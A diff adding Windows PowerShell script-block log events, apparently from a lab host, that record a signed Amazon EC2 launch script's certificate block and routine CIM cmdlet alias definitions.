+# bmNlRVZSb290Q0EuY3J0MEsGA1UdHwREMEIwQKA+oDyGOmh0dHA6Ly9jcmwzLmRp
+# Z2ljZXJ0LmNvbS9EaWdpQ2VydEhpZ2hBc3N1cmFuY2VFVlJvb3RDQS5jcmwwHAYD
+# VR0gBBUwEzAHBgVngQwBAzAIBgZngQwBBAEwDQYJKoZIhvcNAQELBQADggEBAEHx
+# qRH0DxNHecllao3A7pgEpMbjDPKisedfYk/ak1k2zfIe4R7sD+EbP5HU5A/C5pg0
+# /xkPZigfT2IxpCrhKhO61z7H0ZL+q93fqpgzRh9Onr3g7QdG64AupP2uU7SkwaT1
+# IY1rzAGt9Rnu15ClMlIr28xzDxj4+87eg3Gn77tRWwR2L62t0+od/P1Tk+WMieNg
+# GbngLyOOLFxJy34riDkruQZhiPOuAnZ2dMFkkbiJUZflhX0901emWG4f7vtpYeJa
+# 3Cgh6GO6Ps9W7Zrk9wXqyvPsEt84zdp7PiuTUy9cUQBY3pBIowrHC/Q7bVUx8ALM
+# R3eWUaNetbxcyEMRoacwggawMIIEmKADAgECAhAIrUCyYNKcTJ9ezam9k67ZMA0G
+# CSqGSIb3DQEBDAUAMGIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2VydCBJ
+# bmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xITAfBgNVBAMTGERpZ2lDZXJ0
+# IFRydXN0ZWQgUm9vdCBHNDAeFw0yMTA0MjkwMDAwMDBaFw0zNjA0MjgyMzU5NTla
+# MGkxCzAJBgNVBAYTAlVTMRcwFQYDVQQKEw5EaWdpQ2VydCwgSW5jLjFBMD8GA1UE
+# AxM4RGlnaUNlcnQgVHJ1c3RlZCBHNCBDb2RlIFNpZ25pbmcgUlNBNDA5NiBTSEEz
+# ODQgMjAyMSBDQTEwggIiMA0GCSqGSIb3DQEBAQUAA4ICDwAwggIKAoICAQDVtC9C
+# 0CiteLdd1TlZG7GIQvUzjOs9gZdwxbvEhSYwn6SOaNhc9es0JAfhS0/TeEP0F9ce
+# 2vnS1WcaUk8OoVf8iJnBkcyBAz5NcCRks43iCH00fUyAVxJrQ5qZ8sU7H/Lvy0da
+# E6ZMswEgJfMQ04uy+wjwiuCdCcBlp/qYgEk1hz1RGeiQIXhFLqGfLOEYwhrMxe6T
+# SXBCMo/7xuoc82VokaJNTIIRSFJo3hC9FFdd6BgTZcV/sk+FLEikVoQ11vkunKoA
+# FdE3/hoGlMJ8yOobMubKwvSnowMOdKWvObarYBLj6Na59zHh3K3kGKDYwSNHR7Oh
+# D26jq22YBoMbt2pnLdK9RBqSEIGPsDsJ18ebMlrC/2pgVItJwZPt4bRc4G/rJvmM
+# 1bL5OBDm6s6R9b7T+2+TYTRcvJNFKIM2KmYoX7BzzosmJQayg9Rc9hUZTO1i4F4z
+# 8ujo7AqnsAMrkbI2eb73rQgedaZlzLvjSFDzd5Ea/ttQokbIYViY9XwCFjyDKK05
+# huzUtw1T0PhH5nUwjewwk3YUpltLXXRhTT8SkXbev1jLchApQfDVxW0mdmgRQRNY
+# mtwmKwH0iU1Z23jPgUo+QEdfyYFQc4UQIyFZYIpkVMHMIRroOBl8ZhzNeDhFMJlP
+# /2NPTLuqDQhTQXxYPUez+rbsjDIJAsxsPAxWEQIDAQABo4IBWTCCAVUwEgYDVR0T
+# AQH/BAgwBgEB/wIBADAdBgNVHQ4EFgQUaDfg67Y7+F8Rhvv+YXsIiGX0TkIwHwYD
+# VR0jBBgwFoAU7NfjgtJxXWRM3y5nP+e6mK4cD08wDgYDVR0PAQH/BAQDAgGGMBMG
+# A1UdJQQMMAoGCCsGAQUFBwMDMHcGCCsGAQUFBwEBBGswaTAkBggrBgEFBQcwAYYY
+# aHR0cDovL29jc3AuZGlnaWNlcnQuY29tMEEGCCsGAQUFBzAChjVodHRwOi8vY2Fj
+# ZXJ0cy5kaWdpY2VydC5jb20vRGlnaUNlcnRUcnVzdGVkUm9vdEc0LmNydDBDBgNV
+# HR8EPDA6MDigNqA0hjJodHRwOi8vY3JsMy5kaWdpY2VydC5jb20vRGlnaUNlcnRU
+# cnVzdGVkUm9vdEc0LmNybDAcBgNVHSAEFTATMAcGBWeBDAEDMAgGBmeBDAEEATAN
+# BgkqhkiG9w0BAQwFAAOCAgEAOiNEPY0Idu6PvDqZ01bgAhql+Eg08yy25nRm95Ry
+# sQDKr2wwJxMSnpBEn0v9nqN8JtU3vDpdSG2V1T9J9Ce7FoFFUP2cvbaF4HZ+N3HL
+# IvdaqpDP9ZNq4+sg0dVQeYiaiorBtr2hSBh+3NiAGhEZGM1hmYFW9snjdufE5Btf
+# Q/g+lP92OT2e1JnPSt0o618moZVYSNUa/tcnP/2Q0XaG3RywYFzzDaju4ImhvTnh
+# OE7abrs2nfvlIVNaw8rpavGiPttDuDPITzgUkpn13c5UbdldAhQfQDN8A+KVssIh
+# dXNSy0bYxDQcoqVLjc1vdjcshT8azibpGL6QB7BDf5WIIIJw8MzK7/0pNVwfiThV
+# 9zeKiwmhywvpMRr/LhlcOXHhvpynCgbWJme3kuZOX956rEnPLqR0kq3bPKSchh/j
+# wVYbKyP/j7XqiHtwa+aguv06P0WmxOgWkVKLQcBIhEuWTatEQOON8BUozu3xGFYH
+# Ki8QxAwIZDwzj64ojDzLj4gLDb879M4ee47vtevLt/B3E+bnKD+sEq6lLyJsQfmC
+# XBVmzGwOysWGw/YmMwwHS6DTBwJqakAwSEs0qFEgu60bhQjiWQ1tygVQK+pKHJ6l
+# /aCnHwZ05/LWUpD9r4VIIflXO7ScA+2GRfS0YW6/aOImYIbqyK+p/pQd52MbOoZW
+# eE4wggedMIIFhaADAgECAhACxyVvD/v+ctpMbqqoNdVVMA0GCSqGSIb3DQEBCwUA
+# MGkxCzAJBgNVBAYTAlVTMRcwFQYDVQQKEw5EaWdpQ2VydCwgSW5jLjFBMD8GA1UE
+# AxM4RGlnaUNlcnQgVHJ1c3RlZCBHNCBDb2RlIFNpZ25pbmcgUlNBNDA5NiBTSEEz
+# ODQgMjAyMSBDQTEwHhcNMjIxMTA1MDAwMDAwWhcNMjMxMTA4MjM1OTU5WjCB8jET
+# MBEGCysGAQQBgjc8AgEDEwJVUzEZMBcGCysGAQQBgjc8AgECEwhEZWxhd2FyZTEd
+# MBsGA1UEDwwUUHJpdmF0ZSBPcmdhbml6YXRpb24xEDAOBgNVBAUTBzQxNTI5NTQx
+# CzAJBgNVBAYTAlVTMRMwEQYDVQQIEwpXYXNoaW5ndG9uMRAwDgYDVQQHEwdTZWF0
+# dGxlMSIwIAYDVQQKExlBbWF6b24gV2ViIFNlcnZpY2VzLCBJbmMuMRMwEQYDVQQL
+# EwpBbWF6b24gRUMyMSIwIAYDVQQDExlBbWF6b24gV2ViIFNlcnZpY2VzLCBJbmMu
+# MIIBojANBgkqhkiG9w0BAQEFAAOCAY8AMIIBigKCAYEA0jWbhD4ghdeO4Nndy/2h
+# vCCUPPKnL63myeBZYItXG1dnB5gpJIrBVu40V4OaiNwyUAiBrO5eGM4IaWLqbxvj
+# 324KRuXtmHcXvF7YRgiciflrsfzoUEu4TdKj+owTNA2uektzbVLWzT0wFKe5n4Xe
+# CAqQQe33ODVB+cBTUSv/TRWf3Edni17S8HldwSq+YvPIRv21Shp7fiCxO45ETxwl
+# BsoeNrwLAQz0QpiaGdY5Fb+12jcoWRqYqAiXGeDLA7Wxq1+Xj2n+UwelzhYfcE5/
+# p8w4FsFJi9tVb0aWS63OnP+aTOCrA5bz5j9wq8x25/hCGm6HktmbZRwjKiFQ+HdL
+# g0t3250T9hxvXjudh/DGPCIcmQzKBuxijP8f60DutqLk/EsS+Z5xD/s9/rruXfAj
+# czkZ/xpHLHKa+Fp7x+tIwuC5Zq6VAM6CFgJOWefYG5h8sjZFhrphbnYzs0C75SCx
+# KOKFe6RyrQ+O+xh96ky4kw47zNXbbc7xBqVjLjbOgSTFAgMBAAGjggI1MIICMTAf
+# BgNVHSMEGDAWgBRoN+Drtjv4XxGG+/5hewiIZfROQjAdBgNVHQ4EFgQUOv3VJlso
+# 3pHAv43pOWMQfdVdjXkwLgYDVR0RBCcwJaAjBggrBgEFBQcIA6AXMBUME1VTLURF
+# TEFXQVJFLTQxNTI5NTQwDgYDVR0PAQH/BAQDAgeAMBMGA1UdJQQMMAoGCCsGAQUF
+# BwMDMIG1BgNVHR8Ega0wgaowU6BRoE+GTWh0dHA6Ly9jcmwzLmRpZ2ljZXJ0LmNv
+# bS9EaWdpQ2VydFRydXN0ZWRHNENvZGVTaWduaW5nUlNBNDA5NlNIQTM4NDIwMjFD
+# QTEuY3JsMFOgUaBPhk1odHRwOi8vY3JsNC5kaWdpY2VydC5jb20vRGlnaUNlcnRU
+# cnVzdGVkRzRDb2RlU2lnbmluZ1JTQTQwOTZTSEEzODQyMDIxQ0ExLmNybDA9BgNV
+# HSAENjA0MDIGBWeBDAEDMCkwJwYIKwYBBQUHAgEWG2h0dHA6Ly93d3cuZGlnaWNl
+# cnQuY29tL0NQUzCBlAYIKwYBBQUHAQEEgYcwgYQwJAYIKwYBBQUHMAGGGGh0dHA6
+# Ly9vY3NwLmRpZ2ljZXJ0LmNvbTBcBggrBgEFBQcwAoZQaHR0cDovL2NhY2VydHMu
+# ZGlnaWNlcnQuY29tL0RpZ2lDZXJ0VHJ1c3RlZEc0Q29kZVNpZ25pbmdSU0E0MDk2
+# U0hBMzg0MjAyMUNBMS5jcnQwDAYDVR0TAQH/BAIwADANBgkqhkiG9w0BAQsFAAOC
+# AgEARxdSHXYd6BO2G0SQESFEKuC2xGsuekZq4Q//Jg3mHKBkDSLrK1PEriBExb5n
+# JNAmCoh374kLOj9fbV5kPmj2kTdH65b1GVIp4VADVOwla1NGrbqFIvSzUN68xqWw
+# ITM15yR5OU4peuSD8pdxGLwIM3YEsorhVugVI/TZ3oSs89vMNKIUK4qrHvDpveUf
+# 1tQKFYUwyKEkauDqovs2pS7G6+1mqSgXx4Nt1OdZwwdXS8d14xcsaz96C+4G7fAr
+# lbcKiGnHwxlO0FaC+piuverA1NU3lw8UFlTdaQxldKhS47iKZaWTS+mwi2H5PC2G
+# cgXNlQG5tuh/TimhfHpqrvtrXBpNQTU6ydv6E/Bj6DE5VkJGIKua0GvI7LkwFBFC
+# WD1hrAEjtY2LkPAgMDQe9iqPoEGeNwZeEjJjLgayPLP7NsJRdA6uhXboMEFW2LNf
+# VM/hdzl1RG/5kJ4La/mEkpvQRtZRbaSPuSHRxGz//P62qKFQGL0K/YI9RlowyGrQ
+# ENfvztdmqPN8xLJ7C7IuWkx2ygO++4Vva/DaiXX2gMtt6hYYfngOt6+beRWLbpdr
+# cNgUrUJAGg8saVOkrBdziuB0fS93jso0mBvz0DTFXE5vvE8yOYQWR0njIOKbZuB5
+# A15FSIngJ+joE7MFjkxwkQwx5czjrG0GVfqSSK8WiL5yq2wxghnnMIIZ4wIBATB9
+# MGkxCzAJBgNVBAYTAlVTMRcwFQYDVQQKEw5EaWdpQ2VydCwgSW5jLjFBMD8GA1UE
+# AxM4RGlnaUNlcnQgVHJ1c3RlZCBHNCBDb2RlIFNpZ25pbmcgUlNBNDA5NiBTSEEz
+# ODQgMjAyMSBDQTECEALHJW8P+/5y2kxuqqg11VUwDQYJYIZIAWUDBAIBBQCgfDAQ
+# BgorBgEEAYI3AgEMMQIwADAZBgkqhkiG9w0BCQMxDAYKKwYBBAGCNwIBBDAcBgor
+# BgEEAYI3AgELMQ4wDAYKKwYBBAGCNwIBFTAvBgkqhkiG9w0BCQQxIgQgW5Ej8brX
+# 5YlTBkoyY2drpoCT/V57IcT8S8Iq8hJJVtswDQYJKoZIhvcNAQEBBQAEggGAt5Ty
+# 7obsD/Z0ezG66VhUH0wII01W42R03uEEvqZg2YFV6D+kt5pnjZ4xSz+Vu0EP3eth
+# tUZcpF/uZOeLC1OVhCW+/VaqTjLZChaMBxzvEIB+RoUcOnxUJL5d3Qd9TAbLpm6i
+# nrm2KC4cgnNkRUsal37xBaTXPqoayv2ZGpkUtay8UkZzYinn3pKyjdWudevHInbO
+# hRY0LFWi9O3PRE3/iyTCCFP63zkcZrIKCC3Qy4U0oFbXQOZ3DsnJtMuC/1j0tUb5
+# veZmgGjgG1/UGR/55o/cI+NiFMpkodqgyV/td4qrOkLg4SVk8ULKkDNxlhLIjOxg
+# WWYEyrEBr1L5BHO6MxmD9DLl2ysotevtX8WVt5wsgfY2pbGYx8nqFKBVPBhW26p/
+# 33axLhgR8rNhhRRkU/W3uT1bW3x0sfssTaF6R3riQhrex27IJFPTLwOeJEQ5UhhE
+# IMdmXSQYEPHEQ4RqUTISJsMJ8KZrwktxpETj0cH3mSkmhFIiMpVwaQ633m5qoYIX
+# PTCCFzkGCisGAQQBgjcDAwExghcpMIIXJQYJKoZIhvcNAQcCoIIXFjCCFxICAQMx
+# DzANBglghkgBZQMEAgEFADB3BgsqhkiG9w0BCRABBKBoBGYwZAIBAQYJYIZIAYb9
+# bAcBMDEwDQYJYIZIAWUDBAIBBQAEIHZBTdEg6m7H1JWYSgkwZqZJca9sn4GAr8Tv
+# //NRYrMmAhBBWvl/ekQTLH0fNK1QEpn/GA8yMDIyMTIyNDA5MjMyNlqgghMHMIIG
+# wDCCBKigAwIBAgIQDE1pckuU+jwqSj0pB4A9WjANBgkqhkiG9w0BAQsFADBjMQsw
+# CQYDVQQGEwJVUzEXMBUGA1UEChMORGlnaUNlcnQsIEluYy4xOzA5BgNVBAMTMkRp
+# Z2lDZXJ0IFRydXN0ZWQgRzQgUlNBNDA5NiBTSEEyNTYgVGltZVN0YW1waW5nIENB
+# MB4XDTIyMDkyMTAwMDAwMFoXDTMzMTEyMTIzNTk1OVowRjELMAkGA1UEBhMCVVMx
+# ETAPBgNVBAoTCERpZ2lDZXJ0MSQwIgYDVQQDExtEaWdpQ2VydCBUaW1lc3RhbXAg
+# MjAyMiAtIDIwggIiMA0GCSqGSIb3DQEBAQUAA4ICDwAwggIKAoICAQDP7KUmOsap
+# 8mu7jcENmtuh6BSFdDMaJqzQHFUeHjZtvJJVDGH0nQl3PRWWCC9rZKT9BoMW15GS
+# OBwxApb7crGXOlWvM+xhiummKNuQY1y9iVPgOi2Mh0KuJqTku3h4uXoW4VbGwLpk
+# U7sqFudQSLuIaQyIxvG+4C99O7HKU41Agx7ny3JJKB5MgB6FVueF7fJhvKo6B332
+# q27lZt3iXPUv7Y3UTZWEaOOAy2p50dIQkUYp6z4m8rSMzUy5Zsi7qlA4DeWMlF0Z
+# Wr/1e0BubxaompyVR4aFeT4MXmaMGgokvpyq0py2909ueMQoP6McD1AGN7oI2TWm
+# tR7aeFgdOej4TJEQln5N4d3CraV++C0bH+wrRhijGfY59/XBT3EuiQMRoku7mL/6
+# T+R7Nu8GRORV/zbq5Xwx5/PCUsTmFntafqUlc9vAapkhLWPlWfVNL5AfJ7fSqxTl
+# OGaHUQhr+1NDOdBk+lbP4PQK5hRtZHi7mP2Uw3Mh8y/CLiDXgazT8QfU4b3ZXUtu
+# MZQpi+ZBpGWUwFjl5S4pkKa3YWT62SBsGFFguqaBDwklU/G/O+mrBw5qBzliGcnW
+# hX8T2Y15z2LF7OF7ucxnEweawXjtxojIsG4yeccLWYONxu71LHx7jstkifGxxLjn
+# U15fVdJ9GSlZA076XepFcxyEftfO4tQ6dwIDAQABo4IBizCCAYcwDgYDVR0PAQH/
+# BAQDAgeAMAwGA1UdEwEB/wQCMAAwFgYDVR0lAQH/BAwwCgYIKwYBBQUHAwgwIAYD
+# VR0gBBkwFzAIBgZngQwBBAIwCwYJYIZIAYb9bAcBMB8GA1UdIwQYMBaAFLoW2W1N
+# hS9zKXaaL3WMaiCPnshvMB0GA1UdDgQWBBRiit7QYfyPMRTtlwvNPSqUFN9SnDBa
+# BgNVHR8EUzBRME+gTaBLhklodHRwOi8vY3JsMy5kaWdpY2VydC5jb20vRGlnaUNl
+# cnRUcnVzdGVkRzRSU0E0MDk2U0hBMjU2VGltZVN0YW1waW5nQ0EuY3JsMIGQBggr
+# BgEFBQcBAQSBgzCBgDAkBggrBgEFBQcwAYYYaHR0cDovL29jc3AuZGlnaWNlcnQu
+# Y29tMFgGCCsGAQUFBzAChkxodHRwOi8vY2FjZXJ0cy5kaWdpY2VydC5jb20vRGln
+# aUNlcnRUcnVzdGVkRzRSU0E0MDk2U0hBMjU2VGltZVN0YW1waW5nQ0EuY3J0MA0G
+# CSqGSIb3DQEBCwUAA4ICAQBVqioa80bzeFc3MPx140/WhSPx/PmVOZsl5vdyipjD
+# d9Rk/BX7NsJJUSx4iGNVCUY5APxp1MqbKfujP8DJAJsTHbCYidx48s18hc1Tna9i
+# 4mFmoxQqRYdKmEIrUPwbtZ4IMAn65C3XCYl5+QnmiM59G7hqopvBU2AJ6KO4ndet
+# Hxy47JhB8PYOgPvk/9+dEKfrALpfSo8aOlK06r8JSRU1NlmaD1TSsht/fl4JrXZU
+# inRtytIFZyt26/+YsiaVOBmIRBTlClmia+ciPkQh0j8cwJvtfEiy2JIMkU88ZpSv
+# XQJT657inuTTH4YBZJwAwuladHUNPeF5iL8cAZfJGSOA1zZaX5YWsWMMxkZAO85d
+# NdRZPkOaGK7DycvD+5sTX2q1x+DzBcNZ3ydiK95ByVO5/zQQZ/YmMph7/lxClIGU
+# gp2sCovGSxVK05iQRWAzgOAj3vgDpPZFR+XOuANCR+hBNnF3rf2i6Jd0Ti7aHh2M
+# WsgemtXC8MYiqE+bvdgcmlHEL5r2X6cnl7qWLoVXwGDneFZ/au/ClZpLEQLIgpzJ
+# GgV8unG1TnqZbPTontRamMifv427GFxD9dAq6OJi7ngE273R+1sKqHB+8JeEeOMI
+# A11HLGOoJTiXAdI/Otrl5fbmm9x+LMz/F0xNAKLY1gEOuIvu5uByVYksJxlh9ncB
+# jDCCBq4wggSWoAMCAQICEAc2N7ckVHzYR6z9KGYqXlswDQYJKoZIhvcNAQELBQAw
+# YjELMAkGA1UEBhMCVVMxFTATBgNVBAoTDERpZ2lDZXJ0IEluYzEZMBcGA1UECxMQ
+# d3d3LmRpZ2ljZXJ0LmNvbTEhMB8GA1UEAxMYRGlnaUNlcnQgVHJ1c3RlZCBSb290
+# IEc0MB4XDTIyMDMyMzAwMDAwMFoXDTM3MDMyMjIzNTk1OVowYzELMAkGA1UEBhMC
+# VVMxFzAVBgNVBAoTDkRpZ2lDZXJ0LCBJbmMuMTswOQYDVQQDEzJEaWdpQ2VydCBU
+# cnVzdGVkIEc0IFJTQTQwOTYgU0hBMjU2IFRpbWVTdGFtcGluZyBDQTCCAiIwDQYJ
+# KoZIhvcNAQEBBQADggIPADCCAgoCggIBAMaGNQZJs8E9cklRVcclA8TykTepl1Gh
+# 1tKD0Z5Mom2gsMyD+Vr2EaFEFUJfpIjzaPp985yJC3+dH54PMx9QEwsmc5Zt+Feo
+# An39Q7SE2hHxc7Gz7iuAhIoiGN/r2j3EF3+rGSs+QtxnjupRPfDWVtTnKC3r07G1
+# decfBmWNlCnT2exp39mQh0YAe9tEQYncfGpXevA3eZ9drMvohGS0UvJ2R/dhgxnd
+# X7RUCyFobjchu0CsX7LeSn3O9TkSZ+8OpWNs5KbFHc02DVzV5huowWR0QKfAcsW6
+# Th+xtVhNef7Xj3OTrCw54qVI1vCwMROpVymWJy71h6aPTnYVVSZwmCZ/oBpHIEPj
+# Q2OAe3VuJyWQmDo4EbP29p7mO1vsgd4iFNmCKseSv6De4z6ic/rnH1pslPJSlREr
+# WHRAKKtzQ87fSqEcazjFKfPKqpZzQmiftkaznTqj1QPgv/CiPMpC3BhIfxQ0z9JM
+# q++bPf4OuGQq+nUoJEHtQr8FnGZJUlD0UfM2SU2LINIsVzV5K6jzRWC8I41Y99xh
+# 3pP+OcD5sjClTNfpmEpYPtMDiP6zj9NeS3YSUZPJjAw7W4oiqMEmCPkUEBIDfV8j
+# u2TjY+Cm4T72wnSyPx4JduyrXUZ14mCjWAkBKAAOhFTuzuldyF4wEr1GnrXTdrnS
+# DmuZDNIztM2xAgMBAAGjggFdMIIBWTASBgNVHRMBAf8ECDAGAQH/AgEAMB0GA1Ud
+# DgQWBBS6FtltTYUvcyl2mi91jGogj57IbzAfBgNVHSMEGDAWgBTs1+OC0nFdZEzf
+# Lmc/57qYrhwPTzAOBgNVHQ8BAf8EBAMCAYYwEwYDVR0lBAwwCgYIKwYBBQUHAwgw
+# dwYIKwYBBQUHAQEEazBpMCQGCCsGAQUFBzABhhhodHRwOi8vb2NzcC5kaWdpY2Vy
+# dC5jb20wQQYIKwYBBQUHMAKGNWh0dHA6Ly9jYWNlcnRzLmRpZ2ljZXJ0LmNvbS9E
+# aWdpQ2VydFRydXN0ZWRSb290RzQuY3J0MEMGA1UdHwQ8MDowOKA2oDSGMmh0dHA6
+# Ly9jcmwzLmRpZ2ljZXJ0LmNvbS9EaWdpQ2VydFRydXN0ZWRSb290RzQuY3JsMCAG
+# A1UdIAQZMBcwCAYGZ4EMAQQCMAsGCWCGSAGG/WwHATANBgkqhkiG9w0BAQsFAAOC
+# AgEAfVmOwJO2b5ipRCIBfmbW2CFC4bAYLhBNE88wU86/GPvHUF3iSyn7cIoNqilp
+# /GnBzx0H6T5gyNgL5Vxb122H+oQgJTQxZ822EpZvxFBMYh0MCIKoFr2pVs8Vc40B
+# IiXOlWk/R3f7cnQU1/+rT4osequFzUNf7WC2qk+RZp4snuCKrOX9jLxkJodskr2d
+# fNBwCnzvqLx1T7pa96kQsl3p/yhUifDVinF2ZdrM8HKjI/rAJ4JErpknG6skHibB
+# t94q6/aesXmZgaNWhqsKRcnfxI2g55j7+6adcq/Ex8HBanHZxhOACcS2n82HhyS7
+# T6NJuXdmkfFynOlLAlKnN36TU6w7HQhJD5TNOXrd/yVjmScsPT9rp/Fmw0HNT7ZA
+# myEhQNC3EyTN3B14OuSereU0cZLXJmvkOHOrpgFPvT87eK1MrfvElXvtCl8zOYdB
+# eHo46Zzh3SP9HSjTx/no8Zhf+yvYfvJGnXUsHicsJttvFXseGYs2uJPU5vIXmVnK
+# cPA3v5gA3yAWTyf7YGcWoWa63VXAOimGsJigK+2VQbc61RWYMbRiCQ8KvYHZE/6/
+# pNHzV9m8BPqC3jLfBInwAM1dwvnQI38AC+R2AibZ8GV2QqYphwlHK+Z/GqSFD/yY
+# lvZVVCsfgPrA8g4r5db7qS9EFUrnEw4d2zc4GqEr9u3WfPwwggWNMIIEdaADAgEC
+# AhAOmxiO+dAt5+/bUOIIQBhaMA0GCSqGSIb3DQEBDAUAMGUxCzAJBgNVBAYTAlVT
+# MRUwEwYDVQQKEwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5j
+# b20xJDAiBgNVBAMTG0RpZ2lDZXJ0IEFzc3VyZWQgSUQgUm9vdCBDQTAeFw0yMjA4
+# MDEwMDAwMDBaFw0zMTExMDkyMzU5NTlaMGIxCzAJBgNVBAYTAlVTMRUwEwYDVQQK
+# EwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xITAfBgNV
+# BA</Data><Data Name='ScriptBlockId'>a6967c97-e53c-431d-a156-a7af53a4a0a4</Data><Data Name='Path'>C:\ProgramData\Amazon\EC2-Windows\Launch\Module\Scripts\Add-DnsSuffixList.ps1</Data></EventData></Event>
+<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-PowerShell' Guid='{A0C1853B-5C40-4B15-8766-3CF1C58F985A}'/><EventID>4104</EventID><Version>1</Version><Level>5</Level><Task>2</Task><Opcode>15</Opcode><Keywords>0x0</Keywords><TimeCreated SystemTime='2023-03-20T15:45:22.369022300Z'/><EventRecordID>228594</EventRecordID><Correlation ActivityID='{CB9DD5DA-5B42-0001-FAD6-9DCB425BD901}'/><Execution ProcessID='3300' ThreadID='8648'/><Channel>Microsoft-Windows-PowerShell/Operational</Channel><Computer>mswin-exch01.attackrange.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='MessageNumber'>1</Data><Data Name='MessageTotal'>1</Data><Data Name='ScriptBlockText'>Set-Alias -Name ncso -Value New-CimSessionOption -Option ReadOnly, AllScope -ErrorAction SilentlyContinue</Data><Data Name='ScriptBlockId'>3a298af1-d8fe-46a4-b91b-e08faccdc449</Data><Data Name='Path'></Data></EventData></Event>
+<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-PowerShell' Guid='{A0C1853B-5C40-4B15-8766-3CF1C58F985A}'/><EventID>4104</EventID><Version>1</Version><Level>5</Level><Task>2</Task><Opcode>15</Opcode><Keywords>0x0</Keywords><TimeCreated SystemTime='2023-03-20T15:45:22.369005800Z'/><EventRecordID>228588</EventRecordID><Correlation ActivityID='{CB9DD5DA-5B42-0001-FAD6-9DCB425BD901}'/><Execution ProcessID='3300' ThreadID='8648'/><Channel>Microsoft-Windows-PowerShell/Operational</Channel><Computer>mswin-exch01.attackrange.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='MessageNumber'>1</Data><Data Name='MessageTotal'>1</Data><Data Name='ScriptBlockText'>Set-Alias -Name ncms -Value New-CimSession -Option ReadOnly, AllScope -ErrorAction SilentlyContinue</Data><Data Name='ScriptBlockId'>771fbe16-eedd-4eea-a856-673925ce657b</Data><Data Name='Path'></Data></EventData></Event>
+<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-PowerShell' Guid='{A0C1853B-5C40-4B15-8766-3CF1C58F985A}'/><EventID>4104</EventID><Version>1</Version><Level>5</Level><Task>2</Task><Opcode>15</Opcode><Keywords>0x0</Keywords><TimeCreated SystemTime='2023-03-20T15:45:22.368982800Z'/><EventRecordID>228582</EventRecordID><Correlation ActivityID='{CB9DD5DA-5B42-0001-FAD6-9DCB425BD901}'/><Execution ProcessID='3300' ThreadID='8648'/><Channel>Microsoft-Windows-PowerShell/Operational</Channel><Computer>mswin-exch01.attackrange.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='MessageNumber'>1</Data><Data Name='MessageTotal'>1</Data><Data Name='ScriptBlockText'>Set-Alias -Name icim -Value Invoke-CimMethod -Option ReadOnly, AllScope -ErrorAction SilentlyContinue</Data><Data Name='ScriptBlockId'>c702a481-a709-48f0-b8f5-337f1095706e</Data><Data Name='Path'></Data></EventData></Event>
+<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-PowerShell' Guid='{A0C1853B-5C40-4B15-8766-3CF1C58F985A}'/><EventID>4104</EventID><Version>1</Version><Level>5</Level><Task>2</Task><Opcode>15</Opcode><Keywords>0x0</Keywords><TimeCreated SystemTime='2023-03-20T15:44:42.476327400Z'/><EventRecordID>228493</EventRecordID><Correlation ActivityID='{CB9DD5DA-5B42-0002-87D6-9DCB425BD901}'/><Execution ProcessID='5448' ThreadID='5604'/><Channel>Microsoft-Windows-PowerShell/Operational</Channel><Computer>mswin-exch01.attackrange.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='MessageNumber'>1</Data><Data Name='MessageTotal'>1</Data><Data Name='ScriptBlockText'>Set-Alias -Name ncso -Value New-CimSessionOption -Option ReadOnly, AllScope -ErrorAction SilentlyContinue</Data><Data Name='ScriptBlockId'>8041dacf-c134-4ca9-b70d-90806e3edf44</Data><Data Name='Path'></Data></EventData></Event>
+<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-PowerShell' Guid='{A0C1853B-5C40-4B15-8766-3CF1C58F985A}'/><EventID>4104</EventID><Version>1</Version><Level>5</Level><Task>2</Task><Opcode>15</Opcode><Keywords>0x0</Keywords><TimeCreated SystemTime='2023-03-20T15:44:42.476311000Z'/><EventRecordID>228487</EventRecordID><Correlation ActivityID='{CB9DD5DA-5B42-0002-87D6-9DCB425BD901}'/><Execution ProcessID='5448' ThreadID='5604'/><Channel>Microsoft-Windows-PowerShell/Operational</Channel><Computer>mswin-exch01.attackrange.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='MessageNumber'>1</Data><Data Name='MessageTotal'>1</Data><Data Name='ScriptBlockText'>Set-Alias -Name ncms -Value New-CimSession -Option ReadOnly, AllScope -ErrorAction SilentlyContinue</Data><Data Name='ScriptBlockId'>e1621ee1-ae19-4c44-9dd0-387ec317f9ae</Data><Data Name='Path'></Data></EventData></Event>
+<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-PowerShell' Guid='{A0C1853B-5C40-4B15-8766-3CF1C58F985A}'/><EventID>4104</EventID><Version>1</Version><Level>5</Level><Task>2</Task><Opcode>15</Opcode><Keywords>0x0</Keywords><TimeCreated SystemTime='2023-03-20T15:44:42.476293400Z'/><EventRecordID>228481</EventRecordID><Correlation ActivityID='{CB9DD5DA-5B42-0002-87D6-9DCB425BD901}'/><Execution ProcessID='5448' ThreadID='5604'/><Channel>Microsoft-Windows-PowerShell/Operational</Channel><Computer>mswin-exch01.attackrange.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='MessageNumber'>1</Data><Data Name='MessageTotal'>1</Data><Data Name='ScriptBlockText'>Set-Alias -Name icim -Value Invoke-CimMethod -Option ReadOnly, AllScope -ErrorAction SilentlyContinue</Data><Data Name='ScriptBlockId'>3ce17f19-9aa1-4d81-86cd-957c512e41f4</Data><Data Name='Path'></Data></EventData></Event>
